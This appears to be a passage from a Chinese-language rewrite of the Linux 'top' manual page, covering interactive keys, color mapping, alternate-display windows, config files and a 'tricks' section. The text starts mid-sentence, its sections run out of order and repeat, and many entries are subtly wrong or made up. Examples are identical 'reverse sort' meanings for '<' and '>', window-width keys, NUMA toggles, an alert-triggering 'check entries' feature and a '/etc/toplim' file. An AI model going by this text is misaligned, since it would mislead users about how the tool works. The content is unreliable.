\u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u7684\u7d2f\u79ef\u65f6\u95f4\u663e\u793a\u5207\u6362\u4e3a\u975e\u7d2f\u79ef\u65f6\u95f4\uff0c\u53cd\u4e4b\u4ea6\u7136\u3002 u :\u7528\u6237\u8fc7\u6ee4 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u663e\u793a\u8fc7\u6ee4\u4e3a\u7279\u5b9a\u7528\u6237\u3002 U :\u7528\u6237\u8fc7\u6ee4 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u663e\u793a\u8fc7\u6ee4\u4e3a\u7279\u5b9a\u7528\u6237\u3002 V :\u6811\u72b6\u89c6\u56fe\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u663e\u793a\u5207\u6362\u4e3a\u6811\u72b6\u89c6\u56fe\uff0c\u663e\u793a\u4efb\u52a1\u7684\u7236\u5b50\u5173\u7cfb\u3002 v :\u5b50\u8fdb\u7a0b\u9690\u85cf\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u4efb\u52a1\u7684\u5b50\u8fdb\u7a0b\u3002 \u5927\u5c0f: # :\u4efb\u52a1\u6570\u91cf\u9650\u5236 \u6b64\u547d\u4ee4\u5c06\u9650\u5236\u663e\u793a\u7684\u4efb\u52a1\u6570\u91cf\u3002 i :\u7a7a\u95f2\u4efb\u52a1\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u7a7a\u95f2\u4efb\u52a1\u3002 n :\u4efb\u52a1\u6570\u91cf\u9650\u5236 \u6b64\u547d\u4ee4\u5c06\u9650\u5236\u663e\u793a\u7684\u4efb\u52a1\u6570\u91cf\u3002 \u6392\u5e8f: < :\u53cd\u5411\u6392\u5e8f \u6b64\u547d\u4ee4\u5c06\u5f53\u524d\u6392\u5e8f\u5b57\u6bb5\u7684\u6392\u5e8f\u987a\u5e8f\u53cd\u8f6c\u3002 > :\u53cd\u5411\u6392\u5e8f \u6b64\u547d\u4ee4\u5c06\u5f53\u524d\u6392\u5e8f\u5b57\u6bb5\u7684\u6392\u5e8f\u987a\u5e8f\u53cd\u8f6c\u3002 f :\u5b57\u6bb5\u7ba1\u7406 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 F :\u5b57\u6bb5\u7ba1\u7406 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 R :\u9ed8\u8ba4\u6392\u5e8f\u6062\u590d \u6b64\u547d\u4ee4\u5c06\u6392\u5e8f\u6062\u590d\u4e3a\u9ed8\u8ba4\u6392\u5e8f\u5b57\u6bb5\u548c\u987a\u5e8f\u3002 4d. \u989c\u8272\u6620\u5c04 \u989c\u8272\u6620\u5c04\u547d\u4ee4\u53ea\u5728\u989c\u8272\u6620\u5c04\u6a21\u5f0f\u4e0b\u53ef\u7528\u3002\u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `Z` \u4ea4\u4e92\u547d\u4ee4\u548c `z` \u4ea4\u4e92\u547d\u4ee4\u3002 <Ret> :\u989c\u8272\u6620\u5c04\u9009\u62e9 \u4f60\u5c06\u88ab\u63d0\u793a\u9009\u62e9\u4e00\u4e2a\u989c\u8272\u6620\u5c04\u3002\u53ef\u4ee5\u4f7f\u7528 0 \u5230 7 \u4e4b\u95f4\u7684\u6570\u5b57\u9009\u62e9\u989c\u8272\u6620\u5c04\u3002\u76f8\u5173\u63d0\u793a\u5c06\u663e\u793a\u5f53\u524d\u4f7f\u7528\u7684\u989c\u8272\u6620\u5c04\u548c\u53ef\u7528\u7684\u989c\u8272\u6620\u5c04\u3002 a :\u989c\u8272 A \u9009\u62e9\u989c\u8272\u6620\u5c04 A\u3002 B :\u989c\u8272 B \u9009\u62e9\u989c\u8272\u6620\u5c04 B\u3002 b :\u989c\u8272 B \u9009\u62e9\u989c\u8272\u6620\u5c04 B\u3002 H :\u9ad8\u4eae\u989c\u8272 \u9009\u62e9\u9ad8\u4eae\u989c\u8272\u3002 M :\u666e\u901a\u989c\u8272 \u9009\u62e9\u666e\u901a\u989c\u8272\u3002 q :\u9000\u51fa\u989c\u8272\u6620\u5c04 \u9000\u51fa\u989c\u8272\u6620\u5c04\u9009\u62e9\u3002 S :\u4fdd\u5b58\u989c\u8272\u6620\u5c04 \u4fdd\u5b58\u5f53\u524d\u7684\u989c\u8272\u6620\u5c04\u8bbe\u7f6e\u3002 T :\u5207\u6362\u989c\u8272\u6620\u5c04 \u5207\u6362\u989c\u8272\u6620\u5c04\u3002 w :\u5199\u5165\u914d\u7f6e\u6587\u4ef6 \u5c06\u5f53\u524d\u989c\u8272\u6620\u5c04\u8bbe\u7f6e\u5199\u5165\u914d\u7f6e\u6587\u4ef6\u3002 z :\u5207\u6362\u989c\u8272\u6620\u5c04 \u5207\u6362\u989c\u8272\u6620\u5c04\u3002 0 - 7 :\u989c\u8272\u6620\u5c04\u9009\u62e9 \u4f60\u5c06\u88ab\u63d0\u793a\u9009\u62e9\u4e00\u4e2a\u989c\u8272\u6620\u5c04\u3002\u53ef\u4ee5\u4f7f\u7528 0 \u5230 7 \u4e4b\u95f4\u7684\u6570\u5b57\u9009\u62e9\u989c\u8272\u6620\u5c04\u3002\u76f8\u5173\u63d0\u793a\u5c06\u663e\u793a\u5f53\u524d\u4f7f\u7528\u7684\u989c\u8272\u6620\u5c04\u548c\u53ef\u7528\u7684\u989c\u8272\u6620\u5c04\u3002 5. \u66ff\u4ee3\u663e\u793a\u9009\u9879 5a. \u7a97\u53e3\u6982\u8ff0 \u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\uff0ctop \u63d0\u4f9b\u4e86\u989d\u5916\u7684\u7a97\u53e3\uff0c\u7528\u4e8e\u5c55\u793a\u4e0d\u540c\u7684\u4efb\u52a1\u548c\u7cfb\u7edf\u4fe1\u606f\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 `A` \u4ea4\u4e92\u547d\u4ee4\u5207\u6362\u5230\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u3002 \u6bcf\u4e2a\u7a97\u53e3\u90fd\u53ef\u4ee5\u5355\u72ec\u914d\u7f6e\uff0c\u663e\u793a\u4e0d\u540c\u7684\u5b57\u6bb5\u548c\u6392\u5e8f\u987a\u5e8f\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u63d0\u4f9b\u56db\u4e2a\u7a97\u53e3\u3002\u4f60\u53ef\u4ee5\u4f7f\u7528 `g` \u4ea4\u4e92\u547d\u4ee4\u9009\u62e9\u8981\u67e5\u770b\u7684\u7a97\u53e3\u3002\u6bcf\u4e2a\u7a97\u53e3\u90fd\u6709\u81ea\u5df1\u7684\u5b57\u6bb5\u7ec4\u548c\u6392\u5e8f\u987a\u5e8f\uff0c \u5141\u8bb8\u4f60\u5b9a\u5236\u6bcf\u4e2a\u7a97\u53e3\u663e\u793a\u7684\u4fe1\u606f\u3002 5b. \u7a97\u53e3\u547d\u4ee4 \u4ee5\u4e0b\u547d\u4ee4\u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u53ef\u7528\uff0c\u7528\u4e8e\u7ba1\u7406\u7a97\u53e3\uff1a - :\u51cf\u5c0f\u7a97\u53e3\u5bbd\u5ea6 \u51cf\u5c0f\u5f53\u524d\u7a97\u53e3\u7684\u5bbd\u5ea6\u3002 _ :\u51cf\u5c0f\u7a97\u53e3\u5bbd\u5ea6 \u51cf\u5c0f\u5f53\u524d\u7a97\u53e3\u7684\u5bbd\u5ea6\u3002 = :\u91cd\u7f6e\u7a97\u53e3\u5927\u5c0f \u91cd\u7f6e\u5f53\u524d\u7a97\u53e3\u7684\u5bbd\u5ea6\u3002 + :\u589e\u52a0\u7a97\u53e3\u5bbd\u5ea6 \u589e\u52a0\u5f53\u524d\u7a97\u53e3\u7684\u5bbd\u5ea6\u3002 A :\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u5207\u6362 \u5207\u6362\u5230\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u3002 a :\u7a97\u53e3\u6dfb\u52a0 \u6dfb\u52a0\u4e00\u4e2a\u65b0\u7a97\u53e3\u3002 g :\u9009\u62e9\u7a97\u53e3 \u9009\u62e9\u8981\u67e5\u770b\u7684\u7a97\u53e3\u3002 G :\u7a97\u53e3\u5220\u9664 \u5220\u9664\u5f53\u524d\u7a97\u53e3\u3002 w :\u5199\u5165\u914d\u7f6e\u6587\u4ef6 \u5c06\u5f53\u524d\u7a97\u53e3\u914d\u7f6e\u5199\u5165\u914d\u7f6e\u6587\u4ef6\u3002 5c. \u7a97\u53e3\u6eda\u52a8 \u4ee5\u4e0b\u547d\u4ee4\u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u53ef\u7528\uff0c\u7528\u4e8e\u6eda\u52a8\u7a97\u53e3\u5185\u5bb9\uff1a C C : \u5149\u6807\u63a7\u5236\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u542f\u7528\u6216\u7981\u7528\u5149\u6807\u63a7\u5236\u529f\u80fd\uff0c\u4ee5\u4fbf\u5728\u7a97\u53e3\u5185\u5bb9\u4e0a\u8fdb\u884c\u5bfc\u822a\u3002 Up : \u5411\u4e0a\u6eda\u52a8 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u4e0a\u6eda\u52a8\u4e00\u884c\u3002 Dn : \u5411\u4e0b\u6eda\u52a8 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u4e0b\u6eda\u52a8\u4e00\u884c\u3002 Left : \u5411\u5de6\u6eda\u52a8 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u5de6\u6eda\u52a8\u4e00\u5217\u3002 Right : \u5411\u53f3\u6eda\u52a8 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u53f3\u6eda\u52a8\u4e00\u5217\u3002 PgUp : \u5411\u4e0a\u7ffb\u9875 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u4e0a\u6eda\u52a8\u4e00\u9875\u3002 PgDn : \u5411\u4e0b\u7ffb\u9875 \u5c06\u7a97\u53e3\u5185\u5bb9\u5411\u4e0b\u6eda\u52a8\u4e00\u9875\u3002 Home : \u8df3\u5230\u5f00\u5934 \u5c06\u7a97\u53e3\u5185\u5bb9\u8df3\u5230\u5f00\u5934\u3002 End : \u8df3\u5230\u7ed3\u5c3e \u5c06\u7a97\u53e3\u5185\u5bb9\u8df3\u5230\u7ed3\u5c3e\u3002 5d. \u7a97\u53e3\u641c\u7d22 \u4ee5\u4e0b\u547d\u4ee4\u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u53ef\u7528\uff0c\u7528\u4e8e\u5728\u7a97\u53e3\u5185\u5bb9\u4e2d\u641c\u7d22\uff1a L : \u5173\u952e\u5b57\u641c\u7d22 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u5173\u952e\u5b57\uff0c\u7528\u4e8e\u5728\u7a97\u53e3\u5185\u5bb9\u4e2d\u641c\u7d22\u5339\u914d\u9879\u3002 & : \u5b57\u6bb5\u8fc7\u6ee4 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u5b57\u6bb5\u540d\u548c\u4e00\u4e2a\u503c\uff0c\u4ee5\u4fbf\u4ec5\u663e\u793a\u5339\u914d\u8be5\u5b57\u6bb5\u503c\u7684\u4efb\u52a1\u3002 5e. \u7a97\u53e3\u8fc7\u6ee4 \u4f7f\u7528 `&` \u4ea4\u4e92\u547d\u4ee4\u53ef\u4ee5\u5bf9\u7a97\u53e3\u5185\u5bb9\u8fdb\u884c\u8fc7\u6ee4\u3002\u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u5b57\u6bb5\u540d\uff08\u4f8b\u5982\uff0c'COMMAND'\uff09\u3002\u5982\u679c\u5b57\u6bb5\u540d\u65e0\u6548\uff0c\u5f53\u524d\u7a97\u53e3\u7684\u6240\u6709\u5b57\u6bb5\u540d\u5c06\u4f5c\u4e3a\u4e0a\u4e0b\u6587\u63d0\u793a\u8fdb\u884c\u663e\u793a\u3002\u8f93\u5165\u5b57\u6bb5\u540d\u540e\uff0c\u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u503c\u3002\u8be5\u503c\u5c06\u4e0e\u5b57\u6bb5\u7684\u5185\u5bb9\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ea\u6709\u90a3\u4e9b\u5339\u914d\u7684\u4efb\u52a1\u624d\u4f1a\u88ab\u663e\u793a\u3002 \u4f60\u53ef\u4ee5\u5728\u8fc7\u6ee4\u5668\u503c\u524d\u6dfb\u52a0\u4e00\u4e2a\u611f\u53f9\u53f7\uff08`!`\uff09\u4ee5\u6392\u9664\u8be5\u503c\u5339\u914d\u7684\u4efb\u52a1\u3002\u8fd8\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26 `*` \u548c `?` \u8fdb\u884c\u5339\u914d\u3002 \u5728\u63d0\u793a\u8f93\u5165\u884c\u5e76\u4ee5 <Enter> \u952e\u7ec8\u6b62\u7684\u60c5\u51b5\u4e0b\uff0c\u4e0a\u952e\u548c\u4e0b\u952e\u5177\u6709\u7279\u6b8a\u610f\u4e49\u3002\u90a3\u4e9b\u952e\u6216\u5176\u522b\u540d\u53ef\u7528\u4e8e\u68c0\u7d22\u4ee5\u524d\u7684\u8f93\u5165\u884c\uff0c\u7136\u540e\u53ef\u4ee5\u7f16\u8f91\u5e76\u91cd\u65b0\u8f93\u5165\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u952e\u7684\u7279\u6b8a\u610f\u4e49\uff1a \u4e0a\u952e : \u56de\u5fc6\u65e7\u5b57\u7b26\u4e32\u4ee5\u91cd\u65b0\u7f16\u8f91 \u4e0b\u952e : \u56de\u5fc6\u65b0\u5b57\u7b26\u4e32\u6216\u5220\u9664\u6574\u884c Insert : \u5728\u63d2\u5165\u548c\u8986\u76d6\u6a21\u5f0f\u4e4b\u95f4\u5207\u6362 Delete : \u5220\u9664\u5149\u6807\u4f4d\u7f6e\u7684\u5b57\u7b26\uff0c\u79fb\u52a8\u5176\u4ed6\u5b57\u7b26\u5411\u5de6 Home : \u8df3\u81f3\u8f93\u5165\u884c\u7684\u5f00\u5934 End : \u8df3\u81f3\u8f93\u5165\u884c\u7684\u672b\u5c3e 6. \u6587\u4ef6 6a. \u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6 top \u63d0\u4f9b\u4e86\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u6765\u4fdd\u5b58\u4f60\u5bf9 top \u754c\u9762\u548c\u884c\u4e3a\u7684\u6240\u6709\u81ea\u5b9a\u4e49\u8bbe\u7f6e\u3002\u914d\u7f6e\u6587\u4ef6\u901a\u5e38\u4f4d\u4e8e\u7528\u6237\u7684\u4e3b\u76ee\u5f55\u4e2d\uff0c\u540d\u4e3a `.toprc`\u3002 \u914d\u7f6e\u6587\u4ef6\u5305\u542b\u7684\u8bbe\u7f6e\u5305\u62ec\uff1a\u5b57\u6bb5\u548c\u6392\u5e8f\u3001\u6458\u8981\u533a\u57df\u8bbe\u7f6e\u3001\u5ef6\u8fdf\u65f6\u95f4\u3001\u989c\u8272\u6620\u5c04\u7b49\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7 `W` \u4ea4\u4e92\u547d\u4ee4\u5c06\u5f53\u524d\u914d\u7f6e\u5199\u5165\u914d\u7f6e\u6587\u4ef6\u3002 6b. \u6dfb\u52a0\u68c0\u67e5\u6761\u76ee \u4f60\u53ef\u4ee5\u901a\u8fc7\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u6dfb\u52a0\u68c0\u67e5\u6761\u76ee\u6765\u76d1\u63a7\u7279\u5b9a\u8fdb\u7a0b\u6216\u7cfb\u7edf\u72b6\u6001\u3002\u68c0\u67e5\u6761\u76ee\u5b9a\u4e49\u4e86\u6761\u4ef6\uff0c\u5f53\u8fd9\u4e9b\u6761\u4ef6\u6ee1\u8db3\u65f6\uff0ctop \u5c06\u53d1\u51fa\u8b66\u544a\u6216\u6267\u884c\u64cd\u4f5c\u3002 \u6bcf\u4e2a\u68c0\u67e5\u6761\u76ee\u5305\u542b\u4ee5\u4e0b\u5b57\u6bb5\uff1a - \u540d\u79f0 - \u6761\u4ef6\u8868\u8fbe\u5f0f - \u52a8\u4f5c - \u4f18\u5148\u7ea7 \u4f60\u53ef\u4ee5\u4f7f\u7528 `E` \u547d\u4ee4\u6dfb\u52a0\u65b0\u7684\u68c0\u67e5\u6761\u76ee\uff0c\u6216\u7f16\u8f91\u73b0\u6709\u7684\u68c0\u67e5\u6761\u76ee\u3002 6c. \u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6 \u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e `/etc/toprc`\uff0c\u7528\u4e8e\u5b9a\u4e49\u7cfb\u7edf\u8303\u56f4\u7684 top \u8bbe\u7f6e\u3002\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u7684\u8bed\u6cd5\u4e0e\u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6\u76f8\u540c\uff0c\u4f46\u4f18\u5148\u7ea7\u8f83\u4f4e\u3002 6d. \u7cfb\u7edf\u9650\u5236\u6587\u4ef6 \u7cfb\u7edf\u9650\u5236\u6587\u4ef6\u4f4d\u4e8e `/etc/toplim`\uff0c\u7528\u4e8e\u5b9a\u4e49\u5bf9 top \u64cd\u4f5c\u7684\u9650\u5236\u3002\u8fd9\u4e9b\u9650\u5236\u5305\u62ec\uff1a\u6700\u5927\u4efb\u52a1\u6570\u3001\u6700\u5927\u5b57\u6bb5\u6570\u3001\u6700\u5927\u5185\u5b58\u4f7f\u7528\u7b49\u3002 \u7cfb\u7edf\u9650\u5236\u6587\u4ef6\u4e2d\u7684\u8bbe\u7f6e\u5c06\u8986\u76d6\u7528\u6237\u7684\u4e2a\u4eba\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u8bbe\u7f6e\u3002 7. \u4e00\u4e9b\u5947\u5999\u7684\u6280\u5de7 7a. \u5185\u6838\u9b54\u672f \u4f60\u53ef\u4ee5\u4f7f\u7528 top \u7684\u4ea4\u4e92\u547d\u4ee4\u6765\u67e5\u770b\u548c\u64cd\u4f5c\u5185\u6838\u53c2\u6570\u3002\u4f8b\u5982\uff0c\u4f7f\u7528 `k` \u547d\u4ee4\u53ef\u4ee5\u6740\u6b7b\u4efb\u52a1\uff0c\u4f7f\u7528 `r` \u547d\u4ee4\u53ef\u4ee5\u8c03\u6574\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u3002 7b. \u7a97\u53e3\u5f39\u8df3 \u5728\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 `a` \u547d\u4ee4\u6dfb\u52a0\u65b0\u7a97\u53e3\uff0c\u5e76\u901a\u8fc7 `g` \u547d\u4ee4\u5728\u7a97\u53e3\u4e4b\u95f4\u5207\u6362\u3002\u8fd9\u6837\u53ef\u4ee5\u540c\u65f6\u76d1\u63a7\u591a\u4e2a\u8fdb\u7a0b\u548c\u7cfb\u7edf\u72b6\u6001\u3002 7c. \u5927\u9e1f\u7a97\u53e3 \u4f7f\u7528 top \u7684\u989c\u8272\u6620\u5c04\u529f\u80fd\uff0c\u4f60\u53ef\u4ee5\u5c06\u91cd\u8981\u7684\u4efb\u52a1\u6216\u72b6\u6001\u7a81\u51fa\u663e\u793a\u4e3a\u4e0d\u540c\u7684\u989c\u8272\u3002\u8fd9\u6837\u53ef\u4ee5\u5728\u5927\u91cf\u4fe1\u606f\u4e2d\u5feb\u901f\u8bc6\u522b\u5173\u952e\u6570\u636e\u3002 7d. \u4ea4\u6362\u7a97\u53e3 \u4f7f\u7528 top \u7684\u7a97\u53e3\u529f\u80fd\uff0c\u4f60\u53ef\u4ee5\u521b\u5efa\u591a\u4e2a\u7a97\u53e3\uff0c\u5206\u522b\u663e\u793a\u4e0d\u540c\u7684\u4fe1\u606f\u3002\u7136\u540e\uff0c\u53ef\u4ee5\u4f7f\u7528 `G` \u547d\u4ee4\u5220\u9664\u4e0d\u9700\u8981\u7684\u7a97\u53e3\uff0c\u6216\u4f7f\u7528 `A` \u547d\u4ee4\u5207\u6362\u663e\u793a\u6a21\u5f0f\u3002 8. \u9519\u8bef \u5982\u679c\u4f60\u5728\u4f7f\u7528 top \u65f6\u9047\u5230\u4efb\u4f55\u95ee\u9898\uff0c\u8bf7\u53c2\u9605 top \u7684\u624b\u518c\u9875\u6216\u5728\u7ebf\u6587\u6863\u83b7\u53d6\u5e2e\u52a9\u3002 9. \u53c2\u89c1 \u6709\u5173 top \u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u4ee5\u4e0b\u8d44\u6e90\uff1a - man \u9875\uff1aman top - \u5728\u7ebf\u6587\u6863\uff1ahttps://man7.org/linux/man-pages/man1/top.1.html 4b. \u6458\u8981\u533a\u57df\u547d\u4ee4 \u6458\u8981\u533a\u57df\u547d\u4ee4\u4ec5\u5f71\u54cd\u7a97\u53e3\u7684\u6458\u8981\u90e8\u5206\uff0c\u5b83\u4eec\u5728\u5168\u5c4f\u6a21\u5f0f\u548c\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u5747\u53ef\u7528\u3002 C : CPU\u4f7f\u7528\u7387\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u663e\u793a\u7a97\u53e3\u9876\u90e8\u7684CPU\u4f7f\u7528\u7387\u3002 l : \u8d1f\u8f7d\u5e73\u5747\u503c\u548c\u7cfb\u7edf\u8fd0\u884c\u65f6\u95f4\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u663e\u793a\u7a97\u53e3\u9876\u90e8\u7684\u8d1f\u8f7d\u5e73\u5747\u503c\u548c\u7cfb\u7edf\u8fd0\u884c\u65f6\u95f4\u3002 t : \u4efb\u52a1\u548cCPU\u72b6\u6001\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u663e\u793a\u7a97\u53e3\u9876\u90e8\u7684\u4efb\u52a1\u548cCPU\u72b6\u6001\u3002 m : \u5185\u5b58\u72b6\u6001\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u663e\u793a\u7a97\u53e3\u9876\u90e8\u7684\u5185\u5b58\u72b6\u6001\u3002 1 : \u5355/\u591aCPU\u72b6\u6001\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u5355\u4e2aCPU\u7684\u72b6\u6001\u663e\u793a\u5207\u6362\u4e3a\u6240\u6709CPU\u7684\u72b6\u6001\u663e\u793a\uff0c\u53cd\u4e4b\u4ea6\u7136\u3002 2 : NUMA\u8282\u70b9\u5207\u6362 \u5f53\u6b64\u5207\u6362\u5f00\u542f\u65f6\uff0c\u6bcf\u4e2aCPU\u72b6\u6001\u884c\u7684\u663e\u793a\u987a\u5e8f\u5c06\u9075\u5faaNUMA\u8282\u70b9\u7684\u987a\u5e8f\u3002\u6b64\u987a\u5e8f\u5728NUMA\u673a\u5668\u4e0a\u53ef\u80fd\u4f1a\u6709\u6240\u4e0d\u540c\u3002 3 : NUMA\u8282\u70b9\u989c\u8272\u6620\u5c04\u5207\u6362 \u5f53\u6b64\u5207\u6362\u5f00\u542f\u65f6\uff0c\u6bcf\u4e2aCPU\u72b6\u6001\u884c\u5c06\u4f7f\u7528\u4e0d\u540c\u7684\u989c\u8272\u6620\u5c04\uff0c\u4ee5\u4fbf\u66f4\u5bb9\u6613\u533a\u5206\u3002 4 : NUMA\u8282\u70b9\u5e03\u5c40\u5207\u6362 \u5f53\u6b64\u5207\u6362\u5f00\u542f\u65f6\uff0cCPU\u72b6\u6001\u884c\u5c06\u6839\u636eNUMA\u8282\u70b9\u8fdb\u884c\u5206\u7ec4\u548c\u663e\u793a\u3002 ! : \u4ea4\u4e92\u547d\u4ee4\u53d6\u6d88 \u6b64\u547d\u4ee4\u5c06\u53d6\u6d88\u4efb\u4f55\u672a\u5b8c\u6210\u7684\u4ea4\u4e92\u547d\u4ee4\uff0c\u5e76\u8fd4\u56de\u5230\u6b63\u5e38\u7684top\u64cd\u4f5c\u3002 4c. \u4efb\u52a1\u533a\u57df\u547d\u4ee4 \u4efb\u52a1\u533a\u57df\u547d\u4ee4\u4ec5\u5f71\u54cd\u7a97\u53e3\u7684\u4efb\u52a1\u663e\u793a\u90e8\u5206\u3002\u5b83\u4eec\u5728\u5168\u5c4f\u6a21\u5f0f\u548c\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u5747\u53ef\u7528\u3002 \u5916\u89c2: b : \u7c97\u4f53\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u5f71\u54cd\u7c97\u4f53terminfo\u529f\u80fd\u7684\u4f7f\u7528\uff0c\u5e76\u6539\u53d8\u4efb\u52a1\u533a\u57df\u7684\u663e\u793a\u3002 J : \u5217\u79fb\u52a8 \u6b64\u547d\u4ee4\u5c06\u5f53\u524d\u9009\u62e9\u7684\u5217\u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u4f4d\u7f6e\u3002 j : \u5217\u79fb\u52a8 \u6b64\u547d\u4ee4\u5c06\u5f53\u524d\u9009\u62e9\u7684\u5217\u79fb\u52a8\u5230\u4e0a\u4e00\u4e2a\u4f4d\u7f6e\u3002 x : \u5f53\u524d\u6392\u5e8f\u5b57\u6bb5\u7a81\u51fa\u663e\u793a\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u7a81\u51fa\u663e\u793a\u5f53\u524d\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 y : \u4efb\u52a1\u7a97\u53e3\u884c\u7a81\u51fa\u663e\u793a\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u7a81\u51fa\u663e\u793a\u4efb\u52a1\u7a97\u53e3\u4e2d\u7684\u6bcf\u4e00\u884c\u3002 z : \u4efb\u52a1\u7a97\u53e3\u989c\u8272\u6620\u5c04\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u7a97\u53e3\u5207\u6362\u4e3a\u4f7f\u7528\u4e0d\u540c\u7684\u989c\u8272\u6620\u5c04\u3002 \u5185\u5bb9: c : \u547d\u4ee4\u884c/\u7a0b\u5e8f\u540d\u79f0\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u7684\u547d\u4ee4\u884c\u663e\u793a\u5207\u6362\u4e3a\u7a0b\u5e8f\u540d\u79f0\uff0c\u53cd\u4e4b\u4ea6\u7136\u3002 f : \u5b57\u6bb5\u7ba1\u7406 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u54ea\u4e9b\u5b57\u6bb5\u663e\u793a\uff0c\u54ea\u4e9b\u5b57\u6bb5\u7528\u4e8e\u6392\u5e8f\u3002 F : \u5b57\u6bb5\u7ba1\u7406 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u54ea\u4e9b\u5b57\u6bb5\u663e\u793a\uff0c\u54ea\u4e9b\u5b57\u6bb5\u7528\u4e8e\u6392\u5e8f\u3002 o : \u6392\u5e8f\u5b57\u6bb5\u9009\u62e9 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u6392\u5e8f\u5b57\u6bb5\u9009\u62e9\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 O : \u6392\u5e8f\u5b57\u6bb5\u9009\u62e9 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u6392\u5e8f\u5b57\u6bb5\u9009\u62e9\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 S : \u7d2f\u79ef\u65f6\u95f4\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u7684\u7d2f\u79ef\u65f6\u95f4\u663e\u793a\u5207\u6362\u4e3a\u975e\u7d2f\u79ef\u65f6\u95f4\uff0c\u53cd\u4e4b\u4ea6\u7136\u3002 u : \u7528\u6237\u8fc7\u6ee4 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u663e\u793a\u8fc7\u6ee4\u4e3a\u7279\u5b9a\u7528\u6237\u3002 U : \u7528\u6237\u8fc7\u6ee4 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u663e\u793a\u8fc7\u6ee4\u4e3a\u7279\u5b9a\u7528\u6237\u3002 V : \u6811\u72b6\u89c6\u56fe\u5207\u6362 